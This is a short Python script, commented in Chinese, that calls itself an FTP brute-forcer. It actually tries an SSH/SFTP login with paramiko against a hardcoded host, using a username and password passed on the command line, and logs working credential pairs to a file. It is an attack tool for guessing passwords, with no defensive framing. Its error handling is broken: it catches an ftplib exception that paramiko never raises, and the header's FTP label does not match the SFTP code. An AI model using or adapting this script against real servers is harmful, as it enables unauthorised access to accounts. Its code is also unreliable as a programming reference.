# -*- coding: utf-8 -*-
"""
文 件 名: brute_ftp_by_paramiko.py
文件描述: 使用paramiko库暴力破解登陆ftp
作    者: HanKin
创建日期: 2021.08.12
修改日期：2021.08.12

Copyright (c) 2021 HanKin. All rights reserved.
"""

import ftplib 
import socket 
import sys 

import paramiko

user = sys.argv[1] 
passwd = sys.argv[2]
host_name = '1.2.3.4'


try: 

    transport = paramiko.Transport((host_name, 22))
    transport.connect(username = user, password = passwd)
    sftp = paramiko.SFTPClient.from_transport(transport)
    hand = open('ret.txt','a+') 
    hand.write(user + ':' + passwd + '\n') 

except ftplib.error_perm: 
    print('passwd[{}] is wrong!'.format(passwd))

except EOFError:
    print('EOFError')
